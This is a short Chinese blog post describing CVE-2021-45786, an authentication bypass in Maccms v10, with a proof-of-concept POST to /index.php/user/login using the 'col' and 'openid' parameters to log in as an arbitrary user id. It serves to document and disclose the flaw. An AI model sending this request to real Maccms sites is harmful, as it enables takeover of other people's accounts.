# CVE-2021-45786：maccms 任意用户登录 - 徐野子 - 博客园

> 原文：[`www.cnblogs.com/XuyeZi/p/16460003.html`](https://www.cnblogs.com/XuyeZi/p/16460003.html)

## 简介

在 Maccms v10 中，攻击者可以通过向/index.php/user/login 发送“col”和“openid”参数实现越权登陆。

## 受影响版本

| 名称 | 版本 | 语言 | 更新 |
| --- | --- | --- | --- |
| Maccms | 10.0 | PHP | * |

## 漏洞分析

在`\application\common\model\user.php`中的 320 行“col”和“openid”参数客户端可控。(可实现登录任意 id 用户)
![](img/4274ab070510a4d41221fd99dd8a207c.png)

## 漏洞复现

*POC*

```
 POST /index.php/user/login

col=user_id&openid=2 
```

![](img/657ecaccaceb7a2c8243585ceeec8980.png)